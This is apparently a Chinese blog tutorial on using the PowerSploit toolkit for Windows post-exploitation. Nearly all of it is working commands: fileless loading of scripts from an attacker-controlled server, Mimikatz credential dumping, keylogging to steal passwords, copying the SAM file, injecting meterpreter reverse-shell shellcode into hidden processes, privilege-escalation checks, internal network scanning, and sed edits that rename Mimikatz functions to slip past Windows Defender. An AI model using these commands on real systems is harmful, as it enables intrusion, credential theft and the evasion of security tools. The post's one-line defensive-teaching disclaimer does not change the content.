> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hOhykpoE5wT7dk9W6pyBSQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYafOUnnBrPFQG1dEWn2wSa9AJRoZyicRjfPRNruDFL2cKiaAQdc1YkLKYQ/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

PowerSploit  

PowerSploit 是 PowerShell 脚本的集合，集成了很多渗透测试能用到的脚本，是针对 win 系统进行后渗透的利器。  

https://github.com/PowerShellMafia/PowerSploit

这个工具下载完就是一些文件夹分类的 ps 脚本，每个文件夹对应不同功能模块

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYarsEzELoSibBS8MgFHfzSI1OnsYo65SdPGZNF8icYZYvibUG1UweRvGib2w/640?wx_fmt=png)

使用方法就是将脚本文件放在 web 服务器上，通过 PowerShell 的远程加载实现文件不落地执行

Exfiltration

这个模块主要是信息搜集，有啥用呢？

可以获取 hash、截屏、键盘记录等等  

Invoke-mimikatz

猕猴桃获取 hash 神器，通过 powershell 调用 mimikatz

```
PS C: > iex(New-Object net.webclient).Downloadstring('http://192.168.10.1/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1')
```

然后使用 mimikatz 获取 hash 即可（管理员权限）

```
PS C: > Invole-mimikatz -command sekurlsa::logonpassword #会被win10阻拦
PS C: > Invole-mimikatz -command lsadump::asm           #从sam文件中获取
```

Get-Keystrokes

无敌的键盘记录器 ，记录按键、时间和活动窗口 ，主要是窃取账户密码用

```
PS C: > iex(New-Object net.webclient).Downloadstring('http://192.168.10.1/PowerSploit/Exfiltration/Get-Keystrokes.ps1')
PS C: > Get-Keystrokes -LogPath C:\123.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYaHnXuTBdGy89yXVasgMVxvicNicDCqwuMjIs5roeWq2O5BeKobg9mYhOQ/640?wx_fmt=png)  

Invoke-NinjaCopy

复制一些系统无法复制的文件，如 sam 文件 ( 管理员权限 )

```
PS C: > iex(New-Object net.webclient).Downloadstring('http://192.168.10.1/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1')
PS C: > Invoke-NinjaCopy -Path c:\windows\system\config\sam -LocalDestination C:\windows\temp\sam
```

Get-TimedScreenshot

截屏并保存在指定文件夹下

```
PS C: > Get-TimedScreenshot -Path c:\windows\temp\ -Interval 10 -EndTime 12:00
```

CodeExecution 模块

这个模块就是用来执行各种代码的，注入 shellcode，注入 dll 等等。  

Invoke-Shellcode

1. 常用的是调用 Invoke-Shellcode 模块将 shellcode 注入到本地 powershell 当中执行。

首先生成 shellcode，CS 和 msf 的都可以

```
msfvenom -p windows/x64/meterpreter/reverse_http Lhost=192.168.10.1 LPort=8000  -f powershell
```

powershell 接收的 shellcode 格式是 0x00

```
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,0x65......
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYahtCXDSFlUvgo086ia13uBQbyghAnslboa8VdDFsPAuuqMeILicGoeUDg/640?wx_fmt=png)

然后用模块加载 shellcode，-Force 参数会默认执行载荷  

```
PS C:> IEX(New-Object net.webclient).Downloadstring('http://192.168.10.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1')
PS C:> get-help Invoke-Shellcode
PS C:> Invoke-ShellCode -Force -Shellcode 0xfc,0x84....
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYap0JmAKld5fVV2iaJiaWxc3jicNkr4U3LoUKQXbBgubrFgNp8xD9sEjcDA/640?wx_fmt=png)

或者将 shellcode 放在服务器上  

```
PS C:> IEX(New-Object net.webclient).Downloadstring("http://192.168.10.1/123.txt")
PS C:> Invole-ShellCode -Force -Shellcode $buf
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYaxPpBvEdvvnJ0lXEUvE7V7RpibAn9MAMzBHNNuFbzlbOz6MaNuquPJyA/640?wx_fmt=png)

都可以与 msf 建立连接，但是 ps 窗口关闭，连接就会断。  

2. 调用 Invoke-Shellcode 模块将 shellcode 注入到进程当中

因为进程关闭，连接也会停止，所以最好注入到系统进程中去

首先查看注入的进程 ，记录 PID 值

```
C:> taklist
PS C:> ps -Name lsm
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYaYN2UoTtMib3vJdCyDYqHd5UPnOr8PWyqU8Yz3oDiakUybBuxmh49DnOQ/640?wx_fmt=png)

注入到该进程, 不成功就尝试别的进程。  

```
PS C:> Invole-ShellCode -Shellcode -Force $buf -ProcessID 496
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYayJONJXAdmcibF1SDGdJticbMNL4sBqDm3sBzpkpb9PJvCFQT2QG4HdWg/640?wx_fmt=png)

可以开启一个隐藏进程进行注入  

```
PS C:> start-process C:\windows\system32\notepad.exe -WindowStyle Hidden
PS C:> Get-Process Notepad
```

Invoke-Dllinjection

顾名思义注入 dll，但这个就需要将 dll 文件上传到目标机了，文件落地比较危险。

先加载该模块

```
PS C:>  IEX(New-Object net.webclient).Downloadstring('http://192.168.10.1/ps/Exfiltration/Invoke-Mimikatz.ps1')
```

将 dll 文件上传主机后，进行注入到程序

```
PS C:>  Invoke-DllInjection -Dll ./test.dll -ProcessId 8787
```

Privesc 模块  

提权模块，常用的就是使用 Get-System 提升管理员权限  

PowerUP

用来寻找目标主机 windows 服务漏洞进行提权的使用脚本

```
PS C:>  IEX(New-Object net.webclient).Downloadstring('http://192.168.10.1/PowerSploit/Privesc/PowerUp.ps1')
```

这个脚本很多命令可以用啊

```
Invoke-AllChecks #自动执行PowerUp下所有的脚本来检查目标主机 
Find-PathDllHijack #检查当前%PATH%的哪些目录是用户可以写入的
Get-ApplicationHost #利用系统上的application.config文件恢复加密过的应用池和虚拟目录的密码
Get-RegistryAlwaysInstallElevated #检测AlwaysInstallElevated注册表是否被设置,如果被设置,意味着MSI文件是以SYSTEM权限运行的
Get-RegistryAutoLogon #检测windows注册表的AutoAdminLogon项有没有被设置,可查询被设置默认的用户名密码
Get-ServiceDetail  –ServiceName DHCP#返回某服务的信息
Get-ServiceFilePermission #检测当前用户能够在哪些服务的目录写入相关的可执行文件(可以通过这些文件提权)
Test-ServiceDaclPermission #检测所有可用的服务,并尝试对这些打开的服务进行修改(若可修改,返回服务对象)
Get-UnattendedInstallFile #检查以下路径,查找是否存在这些文件(文件中可能包含部署凭据)
Get-ServiceUnquoted #用于检查服务路径,返回包含空格但不带引号的服务路径
Get-ModifiableRegistryAutoRun #检查开机自启动的应用程序路径和注册表键值,返回当前用户可修改的程序路径
Get-ModifiableScheduledTaskFile #返回当前用户能够修改的计划任务程序的名称和路径
Get-Webconfig #返回当前服务器上web.config文件中的数据库连接字符串的明文
```

Reacon 模块

这个模块就是用来扫内网的，通过该主机为跳板机探测内网主机、端口服务等  

Invoke_Portscan

就是用来扫描内网端口

一样的步骤，先调用模块

```
PS C:> IEX(New-Object net.webclient).Downloadstring('http://192.168.10.1/PowerSploit/Recon/Invoke-Portscan.ps1')
```

然后利用 Invoke-Portscan 扫就行了

```
PS C:> Invoke-Portscan -Host 192.168.10.6 -ports "1-1000"
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYaMW1HmmlM7jFibGMLdAPpqC2ntbcHypaDWBjzPpTJgIUaNhRYg5owqjQ/640?wx_fmt=png)

扫到一个 80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYa2aNNickhgbdPSMYZ4ibJ6iau2MCRtdClK8fBvR3qcjsBQlRfDYnXmiaZmw/640?wx_fmt=png)

Invoke-ReverseDnsLookup

反向 DNS 查询，扫描内网主机的 ip 对应的主机名

在内网或域内，每个 IP 都对应一个主机名

```
PS C:> Invoke-ReverseDnsLookup 192.168.10.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYayzCneT1lMFibictk4pdbsJqh3ibPWhbhkxOLuxyCl2wcxRCos9U1aEPFA/640?wx_fmt=png)  

Get-HttpStatus

扫描内网站点的 web 目录，需要一个字典哦

```
PS C:> Get-HttpStatus -Target 192.168.10.6 -Path C:\dict.txt
```

Get-ComputerDetails  

获得登录信息

提示

powershell 命令是可以在 cmd 直接运行的  

```
powershell -com iex(New-Object net.webclient).Downloadstring('http://192.168.10.1/123.txt')
```

如果我们调用模块必须进入 powershell 命令行, 这样才能使用我们调用的模块  

```
C: > powershell
PS C: >
```

免杀的话 Win10 的 Defender 已经标记 PowerSploit 为恶意脚本了

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPdYRemL2kHadlxTGA2jVYacqiaWrOW8PYRGYAhmaTGdwDibNxBTKlticiaDn69zydfqLF9mCSSGu545Q/640?wx_fmt=png)

免杀思路有几点：  

更改 ps 脚本文件名

```
Invoke-Mimikatz.ps1改为psyyds.ps1
```

删除一些空格和注释  

```
sed -i -e '/<#>/c\\' Invoke-Mimikatz.ps1
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
```

更改函数名

```
sed -i -e 's/Invoke-Mimikatz/Invoke-miansha/g' Invoke-Mimikatz.ps1
sed -i -e 's/DumpCreds/DumpCredd/g' Invoke-Mimikatz.ps1
```

然后尝试加载还查杀不  

公众号